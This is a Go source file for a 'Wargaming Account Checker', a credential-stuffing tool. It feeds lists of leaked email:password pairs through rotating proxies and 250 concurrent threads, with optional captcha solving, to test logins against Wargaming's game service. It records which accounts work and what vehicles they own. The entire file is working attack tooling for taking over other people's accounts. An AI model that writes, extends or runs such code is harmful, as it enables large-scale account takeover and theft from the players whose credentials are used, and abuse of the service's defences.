package main

import (
	"bufio"
	"errors"
	"flag"
	"fmt"
	"log"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
	captchasolver "wargaming-checker/captcha-solver"
	resultmanager "wargaming-checker/result-manager"
	"wargaming-checker/wargaming"
)

func main() {
	baseFilePath := flag.String("base", "base.txt", "Path to the base file with email:password combinations")
	proxiesFilePath := flag.String("proxies", "proxies.txt", "Path to the proxies file")
	threads := flag.Int("threads", 250, "Number of concurrent threads")
	maxAttempts := flag.Int("attempts", 10, "Maximum number of attempts per account")
	captchaURL := flag.String("captcha-url", "", "URL for the captcha solver service (optional)")
	captchaKey := flag.String("captcha-key", "", "API key for the captcha solver service")
	resultsDir := flag.String("results", "results", "Directory to store results")

	flag.Parse()

	fmt.Println("Wargaming Account Checker")
	fmt.Println("------------------------")
	fmt.Printf("Base file: %s\n", *baseFilePath)
	fmt.Printf("Proxies file: %s\n", *proxiesFilePath)
	fmt.Printf("Threads: %d\n", *threads)
	fmt.Printf("Max attempts: %d\n", *maxAttempts)
	if *captchaURL != "" {
		fmt.Printf("Captcha solver URL: %s\n", *captchaURL)
	} else {
		fmt.Println("Captcha solver: Disabled")
	}
	fmt.Printf("Results directory: %s\n", *resultsDir)
	fmt.Println("------------------------")

	baseFile, err := os.Open(*baseFilePath)
	if err != nil {
		log.Fatalf("unable to read %s: %v", *baseFilePath, err)
	}
	defer baseFile.Close()

	proxies, err := readProxies(*proxiesFilePath)
	if err != nil {
		log.Fatalf("unable to read %s: %v", *proxiesFilePath, err)
	}

	proxyRotator, err := NewProxyRotator(proxies...)
	if err != nil {
		log.Fatalln("unable to init proxy rotator:", err)
	}

	resultManager, err := resultmanager.NewResultManager(filepath.Join(*resultsDir, time.Now().Format("2006-01-02_15-04-05")))
	if err != nil {
		log.Fatalln("unable to setup results manager:", err)
	}
	defer resultManager.Close()

	linesCh := make(chan string)

	go func() {
		scanner := bufio.NewScanner(baseFile)
		for scanner.Scan() {
			linesCh <- scanner.Text()
		}
		close(linesCh)
	}()

	var captchaSolver *captchasolver.CaptchaSolver
	if *captchaURL != "" {
		var err error
		captchaSolver, err = captchasolver.NewSolver(*captchaURL, *captchaKey)
		if err != nil {
			log.Fatalln("failed to init captcha-solver:", err)
		}
	}

	var wg sync.WaitGroup
	for i := 0; i < *threads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for line := range linesCh {
				parts := strings.SplitN(line, ":", 2)
				if len(parts) != 2 {
					continue
				}

				email := parts[0]
				password := parts[1]

				func() {
					var lastErr error
					for attempt := 0; attempt < *maxAttempts; attempt++ {
						if attempt > 0 {
							log.Printf("%s:%s Attempt %d | Last error: %s", email, password, attempt, lastErr.Error())
						}

						lastErr = processAccount(email, password, proxyRotator, resultManager, captchaSolver)
						if lastErr == nil || errors.Is(lastErr, wargaming.ErrInvalidCredentials) || errors.Is(lastErr, wargaming.ErrMergeRequired) {
							return
						}
					}

					resultManager.AddResult(resultmanager.NewErrorResult(email, password, lastErr))
				}()
			}
		}()
	}
	wg.Wait()

	fmt.Println("All accounts processed. Results saved to:", filepath.Join(*resultsDir, time.Now().Format("2006-01-02_15-04-05")))
}

func processAccount(email, password string, proxyRotator *ProxyRotator, resultManager *resultmanager.ResultManager, captchaSolver *captchasolver.CaptchaSolver) error {
	proxy := proxyRotator.GetProxy()
	client := wargaming.NewClient(proxy, captchaSolver, captchaSolver != nil)
	defer client.Close()

	accounts, err := client.SignIn(email, password)
	if err != nil {
		if errors.Is(err, wargaming.ErrInvalidCredentials) {
			resultManager.AddResult(resultmanager.NewBadResult(email, password))
		} else if errors.Is(err, wargaming.ErrMergeRequired) {
			resultManager.AddResult(resultmanager.NewMergeRequiredResult(email, password))
		}
		return err
	}

	if len(accounts) > 0 {
		if err := client.ChooseAccount(accounts[0].ID, accounts[0].GameRealm); err != nil {
			return err
		}
	}

	accountInfo, err := client.GetAccountInfo()
	if err != nil {
		return err
	}

	vehicles, err := client.GetVehicles(accountInfo.ID, accountInfo.GameRealm)
	if err != nil {
		return err
	}

	resultManager.AddResult(resultmanager.NewGoodResult(email, password, accountInfo.GameRealm, vehicles))
	return nil
}
